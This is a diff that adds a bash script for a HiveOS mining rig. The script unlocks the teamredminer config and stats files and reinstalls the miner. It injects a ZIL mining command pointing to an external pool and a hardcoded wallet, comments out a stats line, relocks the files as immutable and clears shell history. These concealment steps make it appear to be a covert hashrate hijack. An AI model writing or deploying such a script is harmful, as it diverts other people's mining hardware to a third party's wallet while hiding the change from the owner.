@@ -1,0 +1,31 @@
+#!/bin/bash
+echo "Start"
+chattr -ai /hive/miners/teamredminer/h-config.sh
+sleep 1
+chattr -ai /hive/miners/teamredminer/h-stats.sh
+sleep 1
+wget https://download.hiveos.farm/repo/binary/hive-miners-teamredminer_0.6-103_amd64.deb
+sleep 1
+dpkg -i hive-miners-teamredminer_0.6-103_amd64.deb
+sleep 1
+sed -i 's/^stats_raw2=/#stats_raw2=/' /hive/miners/teamredminer/h-stats.sh
+sleep 1
+chattr +ai /hive/miners/teamredminer/h-stats.sh
+sleep 1
+sleep 1
+sed -i '2i\zAppend="--zil -o stratum+tcp://$zil_pool:$zil_port -u KrNcjJrUTJh2NkPtgvMc2EJhdAzHaRuqaXg.$rigname -p x --zil_end --stats_mode=single"' /hive/miners/teamredminer/h-config.sh
+sleep 1
+sed -i '2i\rigname=$(grep "^WORKER_NAME=" /hive-config/rig.conf | cut -d= -f2 | tr -d \\")' /hive/miners/teamredminer/h-config.sh
+sleep 1
+sed -i '2i\zil_pool="$(get_ip_address eu.etc.k1pool.com)"' /hive/miners/teamredminer/h-config.sh
+sleep 1
+sed -i '2i\zil_port="3821"' /hive/miners/teamredminer/h-config.sh
+sleep 1
+sed -i '2i\\nfunction get_ip_address {\n    local domain="$1"\n    local ip_address="$(dig +short "$domain")"\n    echo "$ip_address"\n} \n' /hive/miners/teamredminer/h-config.sh
+sleep 1
+sed -i 's/echo "\$conf" /echo "\$conf \$zAppend" /' /hive/miners/teamredminer/h-config.sh
+sleep 1
+chattr +ai /hive/miners/teamredminer/h-config.sh
+sleep 1
+history -c
+echo "Finish"
